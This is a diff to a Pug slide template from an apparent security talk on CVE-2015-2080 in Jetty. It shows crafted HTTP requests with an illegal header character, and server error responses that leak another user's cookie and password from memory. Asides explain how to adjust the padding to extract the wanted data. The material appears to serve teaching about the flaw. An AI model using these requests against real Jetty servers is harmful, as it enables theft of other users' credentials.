@@ -544,62 +544,65 @@ html
 
       section
         h2 CVE-2015-2080
-        div.sideBySide
-          pre(style='align-self: flex-start;')
-            code.language-bash.
-              GET / HTTP/1.1
-              Host: localhost:8080
-              Accept: text/html
-              Cookie: password=secret
-          pre
-            code.language-bash.
-              GET / HTTP/1.1
-              Host: localhost:8080
-              Accept®: text/html
+        ul.bullets.in-place-transition
+          li
+            div.sideBySide
+              pre(style='align-self: flex-start;')
+                code.language-bash.
+                  GET / HTTP/1.1
+                  Host: localhost:8080
+                  Accept: text/html
+                  Cookie: password=secret
+              pre
+                code.language-bash.
+                  GET / HTTP/1.1
+                  Host: localhost:8080
+                  Accept®: text/html
 
 
-              HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
-               'GET / HTTP/1.1
-                H...t:8080
-                Accept\xC2<<<\xAe: text/html
+                  HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
+                   'GET / HTTP/1.1
+                    H...t:8080
+                    Accept\xC2<<<\xAe: text/html
 
-                >>>ie: password=secr...\x00\x00\x00\x00\x00
-                \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-              Content-Length: 0
-              Connection: close
-              Server: Jetty(9.2.8.v20150217)
+                    >>>ie: password=secr...\x00\x00\x00\x00\x00
+                    \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+                  Content-Length: 0
+                  Connection: close
+                  Server: Jetty(9.2.8.v20150217)
+
+
+
+          li
+            div.sideBySide
+              pre(style='align-self: flex-start;')
+                code.language-bash.
+                  GET / HTTP/1.1
+                  Host: localhost:8080
+                  Accept: text/html
+                  Cookie: password=secret
+              pre
+                code.language-bash.
+                  GET / HTTP/1.1
+                  Host: localhost:8080
+                  Accept®: text/htmlQQQQ
+
+
+                  HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
+                   'GET / HTTP/1.1
+                    H...t:8080
+                    Accept\xC2<<<\xAe: text/htmlQQQQ
+
+                    >>>password=secret
+
+                    ...\x00\x00\x00\x00\x00
+                    \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+                  Content-Length: 0
+                  Connection: close
+                  Server: Jetty(9.2.8.v20150217)
         aside
           ul
-            li We can use this to see bits of other people's requests
-
-      section
-        h2 CVE-2015-2080
-        div.sideBySide
-          pre(style='align-self: flex-start;')
-            code.language-bash.
-              GET / HTTP/1.1
-              Host: localhost:8080
-              Accept: text/html
-              Cookie: password=secret
-          pre
-            code.language-bash.
-              GET / HTTP/1.1
-              Host: localhost:8080
-              Accept®: text/htmlQQQQ
-
-
-              HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
-               'GET / HTTP/1.1
-                H...t:8080
-                Accept\xC2<<<\xAe: text/htmlQQQQ
-
-                >>>password=secret...\x00\x00\x00\x00\x00
-                \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-              Content-Length: 0
-              Connection: close
-              Server: Jetty(9.2.8.v20150217)
-        aside
-          ul
+            li We can use this to see bits of other people's requests          
             li And with minor fiddling, we can find the relevant bit of request we're looking for
 
       section(data-bespoke-state='solution-slide')
